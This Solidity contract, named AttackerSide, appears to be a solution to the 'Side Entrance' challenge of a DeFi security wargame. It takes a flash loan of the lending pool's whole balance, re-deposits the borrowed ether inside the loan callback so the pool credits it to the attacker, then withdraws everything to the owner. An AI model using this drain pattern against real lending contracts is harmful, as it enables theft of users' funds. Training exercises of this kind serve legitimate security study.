//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./SideEntranceLenderPool.sol";

contract AttackerSide is Ownable {

    SideEntranceLenderPool side;


    constructor(address _side){
        side = SideEntranceLenderPool(_side);
    }



    function callFlash()public onlyOwner{
        uint amountInSide = address(side).balance;
        side.flashLoan(amountInSide);
        side.withdraw();
    }


    //Callback
    function execute() external payable{
        require(msg.sender == address(side), "Contract Side is not the caller");
        side.deposit{value: address(this).balance}();
    }



    function withdrawAll()public onlyOwner{
        payable(owner()).transfer(address(this).balance);
    }



    receive()external payable{

    }


}
